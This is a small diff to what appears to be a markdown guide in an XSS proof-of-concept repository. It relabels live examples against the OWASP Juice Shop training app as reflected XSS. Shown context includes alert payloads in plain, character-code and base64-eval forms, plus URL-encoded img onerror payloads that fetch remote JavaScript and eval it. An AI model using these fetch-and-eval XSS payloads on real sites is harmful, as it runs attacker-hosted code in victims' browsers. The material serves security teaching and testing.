@@ -20,7 +20,7 @@
 alert('DOMAIN: '.concat(document.domain).concat('\nORIGIN: ').concat(window.origin));
 ```
 
-* *(live example - OWASP juice shop)*
+* *(live example - OWASP juice shop - reflected XSS)*
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch('%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleStd.js').then(function(r)%7Breturn%20r.text().then(function(t)%7Breturn%20eval(t);%7D)%7D);%22%3E
 
@@ -29,7 +29,7 @@ alert('DOMAIN: '.concat(document.domain).concat('\nORIGIN: ').concat(window.orig
 alert(String.fromCharCode(68,79,77,65,73,78,58,32).concat(document.domain).concat(String.fromCharCode(10,79,82,73,71,73,78,58,32)).concat(window.origin));
 ```
 
-* *(live example - OWASP juice shop)*
+* *(live example - OWASP juice shop - reflected XSS)*
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch('%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleDec.js').then(function(r)%7Breturn%20r.text().then(function(t)%7Breturn%20eval(t);%7D)%7D);%22%3E
 
@@ -38,7 +38,7 @@ alert(String.fromCharCode(68,79,77,65,73,78,58,32).concat(document.domain).conca
 eval(atob('YWxlcnQoJ0RPTUFJTjogJy5jb25jYXQoZG9jdW1lbnQuZG9tYWluKS5jb25jYXQoJ1xuT1JJR0lOOiAnKS5jb25jYXQod2luZG93Lm9yaWdpbikpOwo='));
 ```
 
-* *(live example - OWASP juice shop)*
+* *(live example - OWASP juice shop - reflected XSS)*
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch('%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleB64.js').then(function(r)%7Breturn%20r.text().then(function(t)%7Breturn%20eval(t);%7D)%7D);%22%3E
 
